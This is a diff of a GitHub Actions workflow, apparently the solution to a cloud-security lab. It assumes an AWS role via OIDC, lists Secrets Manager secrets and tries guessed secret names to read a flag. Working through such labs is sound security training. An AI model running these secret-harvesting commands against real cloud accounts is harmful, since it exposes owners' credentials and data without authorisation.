@@ -1,38 +1,41 @@
-name: Assume AWS Role via OIDC
+name: Assume AWS Role via GitHub OIDC - sts-lab-2-target
 
 on:
-  workflow_dispatch:   # Allows manual trigger
+  workflow_dispatch:     # Allows you to trigger manually from GitHub UI
   push:
     branches: [ main ]
 
 permissions:
-  id-token: write    # Required to request OIDC token
+  id-token: write        # Required for OIDC token
   contents: read
 
 jobs:
-  assume-role:
+  assume-and-read-flag:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout code
+      - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Configure AWS credentials via OIDC
+      - name: Configure AWS Credentials (OIDC)
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::152815104156:role/sts-lab-2-target
-          role-session-name: github-oidc-session
+          role-session-name: github-oidc-lab
           audience: sts.amazonaws.com
+          aws-region: us-east-1          # ← This was missing! (most common default)
 
-      - name: Verify assumed role
+      - name: Verify assumed identity
         run: aws sts get-caller-identity
 
-      - name: List Secrets Manager secrets
-        run: aws secretsmanager list-secrets --query 'SecretList[].Name'
+      - name: List Secrets
+        run: aws secretsmanager list-secrets --query 'SecretList[].Name' --output table
 
-      - name: Read the flag
+      - name: Read the Flag
         run: |
-          aws secretsmanager get-secret-value --secret-id flag --query 'SecretString' --output text || \
-          aws secretsmanager get-secret-value --secret-id lab-flag --query 'SecretString' --output text || \
-          aws secretsmanager get-secret-value --secret-id secret --query 'SecretString' --output text || \
-          echo "Flag not found with common names - check list-secrets output"
+          echo "=== Trying common secret names ==="
+          aws secretsmanager get-secret-value --secret-id flag --query 'SecretString' --output text 2>/dev/null || \
+          aws secretsmanager get-secret-value --secret-id lab-flag --query 'SecretString' --output text 2>/dev/null || \
+          aws secretsmanager get-secret-value --secret-id secret --query 'SecretString' --output text 2>/dev/null || \
+          aws secretsmanager get-secret-value --secret-id sts-lab-2-flag --query 'SecretString' --output text 2>/dev/null || \
+          echo "[-] Flag not found. Check the list-secrets output above."
